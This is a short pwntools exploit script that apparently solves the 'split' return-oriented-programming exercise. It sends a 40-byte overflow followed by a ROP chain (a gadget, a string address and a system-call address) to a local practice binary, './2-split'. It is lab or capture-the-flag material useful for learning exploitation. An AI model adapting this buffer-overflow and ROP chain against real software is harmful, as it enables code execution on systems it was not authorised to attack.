from pwn import *
from sys import stdout

def main():
    # Build binary
    targetProcess = ELF("./2-split")

    # Build ROP object
    targetAddresses = [p64(4196291)]
    arguments       = [p64(6295648), p64(4196171)]

    # Prepare payload
    payload = b"A"*40
    # This is like saying: "Jump to this address and use these arguments"
    payload += targetAddresses[0] + arguments[0] + arguments[1]

    # Start process
    localProcess = process("./2-split")

    # Advance process
    response = localProcess.recvuntil(b"> ")

    # Send payload
    localProcess.sendline(payload)

    stdout.write(f'{localProcess.recvall()}\n')

if __name__ == '__main__':
    main()
